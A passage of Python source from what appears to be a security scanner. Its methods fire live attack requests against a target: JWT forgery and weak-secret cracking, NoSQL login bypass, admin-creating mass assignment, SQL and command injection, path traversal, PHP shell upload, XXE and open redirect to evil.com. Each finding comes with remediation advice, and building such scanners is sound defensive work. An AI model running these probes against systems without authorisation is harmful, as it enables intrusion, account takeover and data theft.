                    evidence=f"6 rapid failed attempts at {form.action_url}; statuses: {statuses}",
                    remediation="Implement exponential back-off / account lockout / CAPTCHA after repeated failures.",
                ))
        except Exception:
            pass

        return result

    # =========================================================================
    # A07 / A02 — JWT Attacks (unchanged from prior hardened version)
    # =========================================================================

    async def _test_jwt_attacks(self, session, sem, target: str, token: str) -> List[Finding]:
        findings: List[Finding] = []
        if token.startswith("cookie:"):
            return findings  # not a JWT, was a session cookie

        whoami_candidates = [
            urljoin(target, "/rest/user/whoami"),
            urljoin(target, "/api/me"),
            urljoin(target, "/api/user"),
            urljoin(target, "/api/profile"),
        ]

        none_token = _jwt_none_attack(token)
        if none_token:
            for whoami_url in whoami_candidates:
                async with sem:
                    try:
                        async with session.get(
                            whoami_url,
                            headers={"Authorization": f"Bearer {none_token}"},
                            allow_redirects=False,
                        ) as resp:
                            body = await resp.text(errors="replace")
                            if resp.status == 200 and ("email" in body or '"id"' in body):
                                findings.append(self.finding(
                                    title="JWT 'None' Algorithm Attack — Auth Bypass (A02/A07)",
                                    description=(
                                        "Server accepted a JWT with algorithm='none' and no "
                                        "signature. An attacker can forge arbitrary tokens and "
                                        "impersonate any user."
                                    ),
                                    severity=Severity.CRITICAL,
                                    mitre_id="T1078",
                                    evidence=(
                                        f"GET {whoami_url} with alg=none JWT -> HTTP {resp.status}. "
                                        f"Response: {body[:200]}"
                                    ),
                                    remediation=(
                                        "Explicitly whitelist allowed algorithms (RS256/HS256 only). "
                                        "Reject tokens with alg=none unconditionally."
                                    ),
                                ))
                                break
                    except Exception:
                        pass

        payload = _jwt_decode_payload(token)
        if payload:
            sensitive = [
                k for k in payload
                if k.lower() in ("password", "secret", "key", "isadmin", "role", "admin")
            ]
            if sensitive:
                findings.append(self.finding(
                    title="Sensitive Fields in JWT Payload (A02)",
                    description=(
                        f"JWT payload contains sensitive fields: {sensitive}. JWT payloads "
                        "are base64-encoded (not encrypted) — any party holding the token "
                        "can read them."
                    ),
                    severity=Severity.HIGH,
                    mitre_id="T1552",
                    evidence=f"JWT payload keys: {list(payload.keys())}",
                    remediation="Never store sensitive data in JWT payload; use opaque session references.",
                ))

        try:
            import jwt as pyjwt
            for secret in WEAK_JWT_SECRETS:
                try:
                    pyjwt.decode(token, secret, algorithms=["HS256"])
                    findings.append(self.finding(
                        title="JWT Signed with Weak / Guessable Secret (A02)",
                        description=(
                            f"JWT was successfully verified with the trivially guessable "
                            f"secret '{secret}'. An attacker can forge tokens with arbitrary "
                            "claims."
                        ),
                        severity=Severity.CRITICAL,
                        mitre_id="T1078",
                        evidence=f"pyjwt.decode(token, '{secret}', algorithms=['HS256']) succeeded.",
                        remediation="Use a cryptographically random >=256-bit secret; consider RS256.",
                    ))
                    break
                except Exception:
                    pass
        except ImportError:
            pass

        return findings

    # =========================================================================
    # FIX #23 — Dynamic IDOR / BOLA
    # =========================================================================

    async def _test_idor_dynamic(self, session, sem, target: str, auth_token: str) -> List[Finding]:
        findings: List[Finding] = []
        if auth_token.startswith("cookie:"):
            auth_hdr: Dict[str, str] = {}
        else:
            auth_hdr = {"Authorization": f"Bearer {auth_token}"}

        discovered_ids: List[str] = []
        sources_hit: List[str] = []

        for collection_path in ID_DISCOVERY_COLLECTION_PATHS:
            url = urljoin(target, collection_path)
            resp = await self._get(session, sem, url, auth_headers=auth_hdr)
            if not resp:
                continue
            status, _, body = resp
            if status != 200:
                continue
            ids = _extract_object_ids(body)
            if ids:
                discovered_ids.extend(ids)
                sources_hit.append(collection_path)

        # Deduplicate while preserving order.
        seen_ids: Set[str] = set()
        unique_ids: List[str] = []
        for i in discovered_ids:
            if i not in seen_ids:
                seen_ids.add(i)
                unique_ids.append(i)

        used_fallback = False
        if not unique_ids:
            # No IDs could be discovered anywhere — fall back to a minimal
            # numeric probe, but mark it explicitly as an unconfirmed guess
            # rather than presenting it as a discovered object.
            unique_ids = [str(i) for i in range(1, 4)]
            used_fallback = True

        for detail_tpl in ID_DISCOVERY_DETAIL_TEMPLATES:
            for oid in unique_ids[:5]:
                url = urljoin(target, detail_tpl.format(id=oid))
                async with sem:
                    try:
                        async with session.get(url, headers=auth_hdr, allow_redirects=False) as resp:
                            if resp.status != 200:
                                continue
                            body = await resp.text(errors="replace")
                            if any(k in body for k in ('"email"', '"username"', '"id"', '"orderId"')):
                                title = (
                                    f"IDOR via Discovered Object ID '{oid}' at {url} (A01)"
                                    if not used_fallback else
                                    f"IDOR via Fallback Numeric ID '{oid}' at {url} (A01) [unconfirmed object]"
                                )
                                severity = Severity.HIGH if not used_fallback else Severity.MEDIUM
                                findings.append(self.finding(
                                    title=title,
                                    description=(
                                        (
                                            f"An object ID ('{oid}') discovered from a real collection "
                                            f"endpoint ({', '.join(sources_hit) or 'n/a'}) is accessible "
                                            f"at {url} using the authenticated session. Verify whether "
                                            "this object belongs to a different user (cross-user/"
                                            "horizontal access)."
                                        ) if not used_fallback else
                                        (
                                            f"No object IDs could be discovered from any collection "
                                            f"endpoint, so this finding used an UNCONFIRMED fallback "
                                            f"numeric ID ('{oid}'). A 200 response with object-like "
                                            "fields was returned, but this should be manually verified "
                                            "since the ID was guessed, not observed to exist."
                                        )
                                    ),
                                    severity=severity,
                                    mitre_id="T1087",
                                    evidence=f"GET {url} -> HTTP 200 with object-like fields. used_fallback_id={used_fallback}",
                                    remediation="Enforce per-object authorization tied to authenticated user identity; avoid sequential/guessable IDs.",
                                    raw_data={"id": oid, "url": url, "discovered": not used_fallback},
                                ))
                    except Exception:
                        pass

        return findings

    # =========================================================================
    # A04 — Mass Assignment
    # =========================================================================

    async def _test_mass_assignment(self, session, sem, target: str, auth_headers: dict) -> List[Finding]:
        findings: List[Finding] = []
        register_candidates = [
            urljoin(target, "/api/Users/"),
            urljoin(target, "/api/users"),
            urljoin(target, "/api/register"),
            urljoin(target, "/register"),
        ]
        rand_email = "probe_" + "".join(random.choices(string.ascii_lowercase, k=6)) + "@test.invalid"
        payload = {
            "email": rand_email,
            "username": rand_email,
            "password": "Test1234!",
            "passwordRepeat": "Test1234!",
            "isAdmin": True,
            "role": "admin",
            "admin": True,
        }
        for register_url in register_candidates:
            async with sem:
                try:
                    async with session.post(
                        register_url,
                        json=payload,
                        headers={"Content-Type": "application/json"},
                        allow_redirects=False,
                    ) as resp:
                        if resp.status not in (200, 201):
                            continue
                        body = await resp.text(errors="replace")
                        try:
                            body_json = json.loads(body) if body.strip().startswith("{") else {}
                        except Exception:
                            body_json = {}
                        created = body_json.get("data", body_json)
                        if isinstance(created, dict) and (
                            created.get("isAdmin") is True
                            or created.get("role") == "admin"
                            or created.get("admin") is True
                        ):
                            findings.append(self.finding(
                                title=f"Mass Assignment — Admin Privilege Escalation at {register_url} (A04)",
                                description=(
                                    "Registration endpoint accepted privileged fields "
                                    "(isAdmin/role/admin) directly from the request body and "
                                    "created an administrator account. Mass assignment allows "
                                    "privilege escalation."
                                ),
                                severity=Severity.CRITICAL,
                                mitre_id="T1548",
                                evidence=f"POST {register_url} with isAdmin:true -> HTTP {resp.status}. created={created}",
                                remediation="Use strict field allowlists (DTO pattern); never bind raw request body directly to data models.",
                            ))
                            return findings
                except Exception:
                    pass
        return findings

    # =========================================================================
    # A03 — NoSQL Injection
    # =========================================================================

    async def _test_nosql_injection(
        self, session, sem, target: str, form: Optional[DiscoveredLoginForm]
    ) -> List[Finding]:
        findings: List[Finding] = []
        login_url = form.action_url if form else urljoin(target, "/api/login")
        username_field = form.username_field if form else "email"
        password_field = form.password_field if form else "password"

        for op_payload in NOSQL_PAYLOADS:
            payload = {
                username_field: op_payload.get("email", {"$gt": ""}),
                password_field: op_payload.get("password", {"$gt": ""}),
            }
            async with sem:
                try:
                    async with session.post(
                        login_url,
                        json=payload,
                        headers={"Content-Type": "application/json"},
                        allow_redirects=False,
                    ) as resp:
                        if resp.status in (200, 201):
                            body = await resp.text(errors="replace")
                            if "token" in body or "session" in resp.headers.get("Set-Cookie", "").lower():
                                findings.append(self.finding(
                                    title=f"NoSQL Injection — Authentication Bypass at {login_url} (A03)",
                                    description=(
                                        "Login endpoint is vulnerable to MongoDB operator "
                                        "injection. Authentication appears bypassed using "
                                        "$gt/$ne/$regex operators in place of string credentials."
                                    ),
                                    severity=Severity.CRITICAL,
                                    mitre_id="T1190",
                                    evidence=(
                                        f"POST {login_url} payload={json.dumps(payload)[:120]} "
                                        f"-> HTTP {resp.status}"
                                    ),
                                    remediation="Validate that login fields are plain strings before query execution; reject object/operator values.",
                                ))
                                return findings
                except Exception:
                    pass
        return findings

    # =========================================================================
    # A03 — SSTI
    # =========================================================================

    async def _test_ssti(self, session, sem, url: str, auth_headers: dict) -> List[Finding]:
        findings: List[Finding] = []
        if _is_static_asset(url):
            return findings
        base_url = url.split("?")[0]

        for probe_param in PROBE_PARAMS[:3]:
            for payload, expected in SSTI_PAYLOADS:
                test_url = f"{base_url}?{probe_param}={payload}"
                resp = await self._get(session, sem, test_url, auth_headers=auth_headers)
                if resp:
                    body = resp[2]
                    if expected in body and payload not in body:
                        findings.append(self.finding(
                            title=f"Server-Side Template Injection in '{probe_param}' (A03)",
                            description=(
                                f"Template expression '{payload}' was evaluated server-side "
                                f"and returned '{expected}'. SSTI can lead to Remote Code Execution."
                            ),
                            severity=Severity.CRITICAL,
                            mitre_id="T1059",
                            evidence=f"GET {test_url} -> payload evaluated to '{expected}'",
                            remediation="Never pass user input to template engines; use sandboxed template environments.",
                        ))
                        return findings
        return findings

    # =========================================================================
    # Sensitive path probing
    # =========================================================================

    async def _test_sensitive_paths(self, session, sem, target: str, auth_headers: dict) -> List[Finding]:
        findings: List[Finding] = []

        async def probe(path: str) -> Optional[Finding]:
            url = urljoin(target, path)
            resp = await self._get(session, sem, url, auth_headers=auth_headers)
            if not resp:
                return None
            status, headers, body = resp
            body_lower = body.lower()

            if status != 200 or len(body) < 5:
                return None

            if path in ("/ftp/", "/ftp"):
                if any(k in body_lower for k in ("acquisition", "coupon", "index of", ".md", ".bak")):
                    return self.finding(
                        title="Sensitive FTP Directory Exposed (A01)",
                        description=f"FTP directory at {url} is publicly readable — internal files exposed.",
                        severity=Severity.HIGH,
                        mitre_id="T1083",
                        evidence=f"GET {url} -> HTTP {status}. Body: {body[:300]}",
                        remediation="Block web access to /ftp. Move internal files behind authentication.",
                    )
            elif path in ("/administration", "/admin"):
                return self.finding(
                    title="Admin Panel Exposed (A01)",
                    description=f"Administration panel at {url} returned HTTP 200.",
                    severity=Severity.CRITICAL,
                    mitre_id="T1078",
                    evidence=f"GET {url} -> HTTP {status}",
                    remediation="Restrict admin panel to internal network/VPN. Enforce MFA.",
                )
            elif path == "/.env":
                return self.finding(
                    title="Environment File (.env) Publicly Readable (A05)",
                    description=".env file is accessible — may expose API keys, DB credentials, secrets.",
                    severity=Severity.CRITICAL,
                    mitre_id="T1552",
                    evidence=f"GET {url} -> HTTP {status}. Body: {body[:200]}",
                    remediation="Never serve .env files. Add deny rules in the web server config.",
                )
            elif path == "/.git/HEAD":
                return self.finding(
                    title="Git Repository Exposed (A05)",
                    description=f".git directory accessible at {url} — full source code is recoverable.",
                    severity=Severity.CRITICAL,
                    mitre_id="T1083",
                    evidence=f"GET {url} -> HTTP {status}. Content: {body[:80]}",
                    remediation="Block /.git in web server config. Never deploy with .git directory.",
                )
            elif path in ("/api-docs", "/swagger.json", "/openapi.json"):
                return self.finding(
                    title="API Documentation Publicly Exposed (A05)",
                    description=f"API docs at {url} disclose all endpoints, parameters, and schemas.",
                    severity=Severity.MEDIUM,
                    mitre_id="T1592",
                    evidence=f"GET {url} -> HTTP {status}",
                    remediation="Restrict API docs to authenticated users or internal network.",
                )
            elif path == "/metrics":
                if any(k in body for k in ("process_", "http_requests", "nodejs_", "go_")):
                    return self.finding(
                        title="Prometheus Metrics Endpoint Publicly Exposed (A06)",
                        description=f"Metrics at {url} expose internal telemetry (request counts, memory, CPU).",
                        severity=Severity.MEDIUM,
                        mitre_id="T1592",
                        evidence=f"GET {url} -> HTTP {status}. Metrics present.",
                        remediation="Restrict /metrics to monitoring systems. Require auth or firewall rule.",
                    )
            elif path in ("/support/logs", "/encryptionkeys/"):
                return self.finding(
                    title=f"Sensitive Path Exposed: {path} (A01)",
                    description=f"{url} returned HTTP 200 with content — possibly sensitive logs or keys.",
                    severity=Severity.HIGH,
                    mitre_id="T1083",
                    evidence=f"GET {url} -> HTTP {status}. Body: {body[:200]}",
                    remediation="Restrict access with authentication. Remove from public web path.",
                )
            elif path == "/rest/admin/application-configuration":
                return self.finding(
                    title="Admin Application Config Endpoint Exposed (A01)",
                    description=f"Admin configuration at {url} is accessible.",
                    severity=Severity.HIGH,
                    mitre_id="T1592",
                    evidence=f"GET {url} -> HTTP {status}. Body: {body[:300]}",
                    remediation="Restrict admin config endpoints to Administrator role.",
                )
            elif path == "/robots.txt":
                disallowed = re.findall(r"Disallow:\s*(.+)", body)
                if disallowed:
                    return self.finding(
                        title="Robots.txt Discloses Hidden Paths (A06)",
                        description=(
                            f"robots.txt reveals {len(disallowed)} disallowed path(s) that "
                            "should be secret — security-by-obscurity via robots.txt is ineffective."
                        ),
                        severity=Severity.LOW,
                        mitre_id="T1592",
                        evidence=f"Disallowed paths: {disallowed[:10]}",
                        remediation="Do not rely on robots.txt to hide sensitive paths; enforce server-side access controls.",
                    )
            return None

        tasks = [probe(p) for p in SENSITIVE_PATHS]
        results = await asyncio.gather(*tasks, return_exceptions=True)
        for r in results:
            if r and not isinstance(r, Exception):
                findings.append(r)
        return findings

    # =========================================================================
    # FIX #21 — Parameter injection: context-aware XSS, error-based SQLi, CMD, traversal
    # =========================================================================

    async def _test_param_injection(
        self, session, sem, url: str, param: str, auth_headers: dict,
    ) -> List[Finding]:
        findings: List[Finding] = []
        if _is_static_asset(url):
            return findings
        base_url = url.split("?")[0]

        # --- XSS, context-aware -------------------------------------------------
        for payload_tpl in XSS_PAYLOADS[:3]:
            marker = _make_marker()
            # Embed the marker adjacent to the dangerous characters so we can
            # locate exactly where the parser thinks it landed.
            payload = payload_tpl.replace("alert(1)", f"alert('{marker}')").replace("alert(document.cookie)", f"alert('{marker}')")
            if marker not in payload:
                payload = payload + marker
            test_url = base_url + "?" + urlencode({param: payload})
            resp = await self._get(session, sem, test_url, auth_headers=auth_headers)
            if not resp:
                continue
            status, resp_headers, body = resp
            content_type = resp_headers.get("Content-Type", "")
            if "application/json" in content_type.lower() or "javascript" in content_type.lower():
                continue  # not an HTML rendering context, can't be reflected XSS

            ctx = _classify_xss_reflection(marker, body)
            if ctx == "executable":
                findings.append(self.finding(
                    title=f"Reflected XSS in Parameter '{param}' (A03)",
                    description=(
                        f"Parameter '{param}' at {base_url} reflects attacker-controlled "
                        "input into an executable HTML context (script body, event-handler "
                        "attribute, or attribute-breakout) without encoding."
                    ),
                    severity=Severity.HIGH,
                    mitre_id="T1059.007",
                    evidence=f"Payload: {payload}\nURL: {base_url}?{param}=...\nReflection context: {ctx}",
                    remediation="Encode all user output for its rendering context; implement a strict Content-Security-Policy.",
                    raw_data={"param": param, "payload": payload, "url": base_url, "context": ctx},
                ))
                break  # one confirmed XSS per param is sufficient

        # --- SQLi (error-based) --------------------------------------------------
        for payload in SQLI_PAYLOADS_ERROR_BASED:
            test_url = base_url + "?" + urlencode({param: payload})
            resp = await self._get(session, sem, test_url, auth_headers=auth_headers)
            if not resp:
                continue
            status, _, body = resp
            if any(re.search(p, body, re.IGNORECASE) for p in SQLI_ERROR_PATTERNS):
                findings.append(self.finding(
                    title=f"SQL Injection (error-based) in Parameter '{param}' (A03)",
                    description=f"Parameter '{param}' at {base_url} triggers a database error pattern consistent with SQL injection.",
                    severity=Severity.CRITICAL,
                    mitre_id="T1190",
                    evidence=f"Payload: {payload}\nURL: {base_url}?{param}=...",
                    remediation="Use parameterized queries / ORMs; validate all input types.",
                    raw_data={"param": param, "payload": payload, "url": base_url},
                ))
                break

        # --- CMD injection ---------------------------------------------------
        for payload in CMD_INJECTION_PAYLOADS[:3]:
            test_url = base_url + "?" + urlencode({param: payload})
            resp = await self._get(session, sem, test_url, auth_headers=auth_headers)
            if not resp:
                continue
            _, _, body = resp
            if CMD_EXEC_PATTERN.search(body):
                findings.append(self.finding(
                    title=f"OS Command Injection in Parameter '{param}' (A03)",
                    description=f"Parameter '{param}' at {base_url} returns command-execution output, consistent with OS command injection.",
                    severity=Severity.CRITICAL,
                    mitre_id="T1203",
                    evidence=f"Payload: {payload}\nURL: {base_url}?{param}=...",
                    remediation="Avoid system calls with user input; use safe, sandboxed APIs.",
                    raw_data={"param": param, "payload": payload, "url": base_url},
                ))
                break

        # --- Path traversal ----------------------------------------------------
        for payload in PATH_TRAVERSAL_PAYLOADS[:2]:
            test_url = base_url + "?" + urlencode({param: payload})
            resp = await self._get(session, sem, test_url, auth_headers=auth_headers)
            if not resp:
                continue
            _, _, body = resp
            if ("root:" in body and "/bin/" in body) or ("[boot loader]" in body):
                findings.append(self.finding(
                    title=f"Path Traversal in Parameter '{param}' (A01/A03)",
                    description=f"Parameter '{param}' at {base_url} allows reading arbitrary filesystem files via path traversal.",
                    severity=Severity.CRITICAL,
                    mitre_id="T1083",
                    evidence=f"Payload: {payload}\nURL: {base_url}?{param}=...",
                    remediation="Validate and canonicalize file paths; use allowlists, not denylists.",
                    raw_data={"param": param, "payload": payload, "url": base_url},
                ))
                break

        return findings

    # =========================================================================
    # FIX #22 — Real timing-based blind SQLi detection
    # =========================================================================

    async def _test_timing_sqli(
        self, session, sem, url: str, param: str, auth_headers: dict
    ) -> List[Finding]:
        """
        Differential timing test: for each timing payload template, measure a
        baseline (control) request latency, then an injected-delay request
        latency, repeated TRIALS times. Only confirm when the injected request
        is consistently and substantially slower than baseline by roughly the
        injected delay amount, which rules out generic network jitter.
        """
        findings: List[Finding] = []
        if _is_static_asset(url):
            return findings
        base_url = url.split("?")[0]

        TRIALS = 2
        DELAY_S = 4  # keep below typical request_timeout headroom
        JITTER_TOLERANCE = 1.5  # seconds of slack allowed for baseline noise

        control_payload = "1"

        for label, payload_tpl, _default_delay in TIMING_SQLI_PAYLOADS:
            injected_payload = payload_tpl.format(d=DELAY_S)
            control_url = base_url + "?" + urlencode({param: control_payload})
            injected_url = base_url + "?" + urlencode({param: injected_payload})

            confirmations = 0
            last_delta = 0.0

            for _ in range(TRIALS):
                baseline_elapsed = await self._timed_get(session, sem, control_url, auth_headers)
                if baseline_elapsed is None:
                    break
                injected_elapsed = await self._timed_get(session, sem, injected_url, auth_headers)
                if injected_elapsed is None:
                    break

                delta = injected_elapsed - baseline_elapsed
                last_delta = delta
                # Require the injected request to take at least
                # (DELAY_S - JITTER_TOLERANCE) seconds longer than baseline.
                if delta >= (DELAY_S - JITTER_TOLERANCE):
                    confirmations += 1
                else:
                    break  # don't waste further trials if first one disconfirms

            if confirmations == TRIALS:
                findings.append(self.finding(
                    title=f"Blind SQL Injection (time-based, {label}) in Parameter '{param}' (A03)",
                    description=(
                        f"Parameter '{param}' at {base_url} shows a consistent response-time "
                        f"increase of ~{last_delta:.1f}s when a {DELAY_S}s database delay "
                        f"payload ({label}) is injected, across {TRIALS} repeated trials "
                        "against a control baseline. This is consistent with blind/time-based "
                        "SQL injection."
                    ),
                    severity=Severity.CRITICAL,
                    mitre_id="T1190",
                    evidence=(
                        f"Payload: {injected_payload}\nURL: {base_url}?{param}=...\n"
                        f"Measured delta: {last_delta:.2f}s over {TRIALS} trials (threshold {DELAY_S - JITTER_TOLERANCE:.1f}s)"
                    ),
                    remediation="Use parameterized queries / ORMs; validate all input types and reject unexpected operators.",
                    raw_data={"param": param, "payload": injected_payload, "url": base_url, "delta_seconds": last_delta},
                ))
                break  # one confirmed timing-SQLi per param is sufficient

        return findings

    async def _timed_get(self, session, sem, url: str, auth_headers: dict) -> Optional[float]:
        async with sem:
            try:
                hdrs = auth_headers or {}
                ssl_verify = self.options.get("ssl_verify", False)
                start = time.monotonic()
                async with session.get(url, headers=hdrs, allow_redirects=False, ssl=ssl_verify) as resp:
                    await resp.read()
                    return time.monotonic() - start
            except Exception as exc:
                self.logger.debug(f"Timed GET {url} failed: {exc}")
                return None

    # =========================================================================
    # Path traversal on URL path segment
    # =========================================================================

    async def _test_path_traversal_path(self, session, sem, url: str, auth_headers: dict) -> List[Finding]:
        findings: List[Finding] = []
        if _is_static_asset(url):
            return findings
        parsed = urlparse(url)

        for payload in PATH_TRAVERSAL_PAYLOADS[:2]:
            new_path = parsed.path.rstrip("/") + "/" + payload
            new_url = parsed._replace(path=new_path).geturl()
            resp = await self._get(session, sem, new_url, auth_headers=auth_headers)
            if resp and "root:" in resp[2] and "/bin/" in resp[2]:
                findings.append(self.finding(
                    title="Path Traversal via URL Path Segment (A01/A03)",
                    description="Path traversal in URL path — /etc/passwd content returned.",
                    severity=Severity.CRITICAL,
                    mitre_id="T1083",
                    evidence=f"Payload: {payload}\nURL: {new_url}",
                    remediation="Validate and canonicalize file paths. Never construct paths from URL segments.",
                ))
                break
        return findings

    # =========================================================================
    # HTML Form testing
    # =========================================================================

    async def _test_forms(self, session, sem, url: str, auth_headers: dict) -> List[Finding]:
        findings: List[Finding] = []
        if _is_static_asset(url):
            return findings
        resp = await self._get(session, sem, url, auth_headers=auth_headers)
        if not resp:
            return findings
        _, _, body = resp
        forms = re.findall(r'<form[^>]*action=["\']([^"\']*)["\'][^>]*>', body, re.IGNORECASE)
        inputs = re.findall(r'<input[^>]*name=["\']([^"\']+)["\'][^>]*>', body, re.IGNORECASE)
        if not forms or not inputs:
            return findings
        form_url = urljoin(url, forms[0])
        tasks = [
            self._test_param_injection(session, sem, form_url, p, auth_headers)
            for p in inputs[:5]
        ]
        results = await asyncio.gather(*tasks, return_exceptions=True)
        for r in results:
            if isinstance(r, list):
                findings.extend(r)
        return findings

    # =========================================================================
    # FIX #25 — Real CSRF test
    # =========================================================================

    async def _test_csrf(self, session, sem, target: str, auth_headers: dict) -> List[Finding]:
        findings: List[Finding] = []

        for path in CSRF_CANDIDATE_PATHS:
            url = urljoin(target, path)
            resp = await self._get(session, sem, url, auth_headers=auth_headers)
            if not resp:
                continue
            status, headers, body = resp
            if status != 200:
                continue

            # Look for a genuine anti-CSRF token: a hidden input with a known
            # CSRF field name, OR a meta tag commonly used by JS frameworks
            # to ferry the token to AJAX requests.
            has_csrf_input = bool(CSRF_TOKEN_NAME_RE.search(body))
            has_csrf_meta = bool(CSRF_META_TAG_RE.search(body))
            if has_csrf_input or has_csrf_meta:
                continue  # token mechanism present, assume protected

            # Check whether session cookies are at least scoped with
            # SameSite, which provides baseline CSRF mitigation even without
            # an explicit token. If SameSite=Strict/Lax is set on the session
            # cookie, don't flag — note this distinctly from "no protection".
            set_cookie = headers.get("Set-Cookie", "")
            samesite_match = SAMESITE_COOKIE_RE.search(set_cookie)
            if samesite_match and samesite_match.group(1).lower() in ("strict", "lax"):
                continue

            # No token and no SameSite mitigation found — attempt the actual
            # state-changing request without any token to confirm the server
            # doesn't reject it for that reason (e.g. it might still 401/403
            # for unrelated auth reasons, which is NOT a CSRF finding).
            async with sem:
                try:
                    async with session.post(
                        url,
                        data={"_csrf_test_probe": "1"},
                        headers=auth_headers,
                        allow_redirects=False,
                    ) as post_resp:
                        if post_resp.status in (200, 201, 204, 302):
                            findings.append(self.finding(
                                title=f"Missing Anti-CSRF Protection on {url} (A01)",
                                description=(
                                    "A state-changing endpoint has no anti-CSRF token "
                                    "(synchronizer token, double-submit cookie, or CSRF "
                                    "meta tag) and its session cookie does not set a "
                                    "SameSite=Strict/Lax attribute. The endpoint accepted "
                                    "a POST request without any token, consistent with "
                                    "exploitable Cross-Site Request Forgery."
                                ),
                                severity=Severity.HIGH,
                                mitre_id="T1078",
                                evidence=(
                                    f"GET {url}: no CSRF token field/meta found, "
                                    f"Set-Cookie SameSite={samesite_match.group(1) if samesite_match else 'absent'}. "
                                    f"POST {url} without token -> HTTP {post_resp.status}"
                                ),
                                remediation=(
                                    "Implement the synchronizer token pattern (or double-"
                                    "submit cookie) for all state-changing requests, and set "
                                    "SameSite=Strict or Lax on session cookies as defense in depth."
                                ),
                            ))
                except Exception:
                    pass

        return findings

    # =========================================================================
    # File upload (A08)
    # =========================================================================

    async def _test_file_upload_once(self, session, sem, target: str, auth_headers: dict) -> List[Finding]:
        findings: List[Finding] = []
        upload_urls = [
            urljoin(target, "/file-upload"),
            urljoin(target, "/profile/image/file"),
            urljoin(target, "/api/upload"),
            urljoin(target, "/upload"),
        ]

        async def try_upload(upload_url: str, fname: str, content: str, mime: str):
            async with sem:
                data = aiohttp.FormData()
                data.add_field("file", content, filename=fname, content_type=mime)
                try:
                    hdrs = {**auth_headers}
                    async with session.post(upload_url, data=data, headers=hdrs, allow_redirects=False) as resp:
                        body = await resp.text(errors="replace")
                        is_php = fname.endswith((".php", ".phtml", ".php5"))
                        php_executed = any(i in body for i in ["<?php", "PHP Parse error", "system(", "exec(", "pwned"])
                        if resp.status in (200, 201) and is_php and (php_executed or "success" in body.lower()):
                            return self.finding(
                                title="Malicious File Upload Accepted — PHP Shell (A08)",
                                description=(
                                    f"Upload endpoint at {upload_url} accepted a PHP executable file. "
                                    "If accessible via URL, this is Remote Code Execution."
                                ),
                                severity=Severity.CRITICAL,
                                mitre_id="T1190",
                                evidence=f"Uploaded {fname} -> HTTP {resp.status}. Body: {body[:200]}",
                                remediation="Validate file type using magic bytes (not extension). Store uploads outside webroot.",
                            )
                        if fname.endswith(".svg") and resp.status in (200, 201) and ("success" in body.lower() or "filename" in body.lower()):
                            return self.finding(
                                title="SVG Upload Accepted — Potential Stored XSS (A08)",
                                description=(
                                    f"SVG file with embedded <script> tag accepted at {upload_url}. "
                                    "SVG files execute JavaScript when served as text/html."
                                ),
                                severity=Severity.HIGH,
                                mitre_id="T1059.007",
                                evidence=f"Uploaded {fname} (SVG+script) -> HTTP {resp.status}",
                                remediation="Sanitize SVG files on upload; strip <script> tags; serve with Content-Disposition: attachment.",
                            )
                except Exception:
                    return None
            return None

        tasks = [
            try_upload(u, fname, content, mime)
            for u in upload_urls
            for fname, content, mime in FILE_UPLOAD_PAYLOADS
        ]
        results = await asyncio.gather(*tasks, return_exceptions=True)
        for r in results:
            if r and not isinstance(r, Exception):
                findings.append(r)
        return findings

    # =========================================================================
    # XXE (A03)
    # =========================================================================

    async def _test_xxe_once(self, session, sem, target: str, auth_headers: dict) -> List[Finding]:
        findings: List[Finding] = []
        xml_urls = [
            urljoin(target, "/api"),
            urljoin(target, "/xml"),
            urljoin(target, "/soap"),
            urljoin(target, "/rest"),
        ]

        async def try_xxe(xml_url: str, payload: str):
            async with sem:
                hdrs = {**auth_headers, "Content-Type": "application/xml"}
                try:
                    async with session.post(xml_url, data=payload, headers=hdrs) as resp:
                        body = await resp.text(errors="replace")
                        if ("root:" in body and "/bin/" in body) or "etc/hostname" in body:
                            return self.finding(
                                title="XML External Entity (XXE) Injection (A03)",
                                description=(
                                    f"XML endpoint at {xml_url} processed external entities — "
                                    "server filesystem content returned in response."
                                ),
                                severity=Severity.CRITICAL,
                                mitre_id="T1190",
                                evidence=f"XXE payload response: {body[:300]}",
                                remediation="Disable external entity processing; use defusedxml or equivalent safe XML library.",
                            )
                except Exception:
                    return None
            return None

        tasks = [try_xxe(u, p) for u in xml_urls for p in XXE_PAYLOADS]
        results = await asyncio.gather(*tasks, return_exceptions=True)
        for r in results:
            if r and not isinstance(r, Exception):
                findings.append(r)
        return findings

    # =========================================================================
    # Header injection (A05)
    # =========================================================================

    async def _test_header_injection(self, session, sem, url: str) -> List[Finding]:
        findings: List[Finding] = []
        if _is_static_asset(url):
            return findings

        async def try_header(header: str, payload: str):
            async with sem:
                hdrs = {"User-Agent": "SecureForge-BAS/4.0", header: payload}
                try:
                    async with session.get(url, headers=hdrs, allow_redirects=False) as resp:
                        resp_hdr_str = str(dict(resp.headers))
                        injected = payload in resp_hdr_str
                        crlf = (
                            "\r\n" in payload
                            and payload.split("\r\n")[1].split(":")[0].strip() in resp_hdr_str
                        )
                        if injected or crlf:
                            return self.finding(
                                title=f"Header Injection — {header} (A05)",
                                description=f"Header '{header}' value is reflected back into response headers, confirming injection.",
                                severity=Severity.HIGH,
                                mitre_id="T1190",
                                evidence=f"Injected {header}: {payload[:80]} -> reflected in response headers.",
                                remediation="Sanitize and validate all headers before including in responses; strip CR/LF.",
                            )
                except Exception:
                    return None
            return None

        tasks = [try_header(h, p) for h, p in HEADER_INJECTION_PAYLOADS.items()]
        results = await asyncio.gather(*tasks, return_exceptions=True)
        for r in results:
            if r and not isinstance(r, Exception):
                findings.append(r)
        return findings

    # =========================================================================
    # Open Redirect (A01)
    # =========================================================================

    async def _test_open_redirect(self, session, sem, url: str, query: dict) -> List[Finding]:
        findings: List[Finding] = []
        param = next((p for p in REDIRECT_PARAMS if p in query), None)
        if not param:
            return findings

        for payload in OPEN_REDIRECT_PAYLOADS:
            new_q = {k: (v[0] if isinstance(v, list) else v) for k, v in query.items()}
            new_q[param] = payload
            new_url = urlparse(url)._replace(query=urlencode(new_q)).geturl()
            resp = await self._get(session, sem, new_url, allow_redirects=False)
            if resp:
                location = resp[1].get("Location", "")
                if payload in location and "evil.com" in location:
                    findings.append(self.finding(
                        title=f"Open Redirect via '{param}' (A01)",
                        description=f"Parameter '{param}' allows open redirect to an external domain.",
                        severity=Severity.MEDIUM,
                        mitre_id="T1190",
                        evidence=f"Payload: {payload} -> Location: {location}",
                        remediation="Validate redirect targets against an allowlist; never reflect raw user input in Location headers.",
                    ))
                    break
        return findings

    # =========================================================================
    # SSRF (A10)
    # =========================================================================

    async def _test_ssrf(self, session, sem, url: str, query: dict, auth_headers: dict) -> List[Finding]:
        findings: List[Finding] = []
        param = next((p for p in SSRF_PARAMS if p in query), next(iter(query), None))
        if not param:
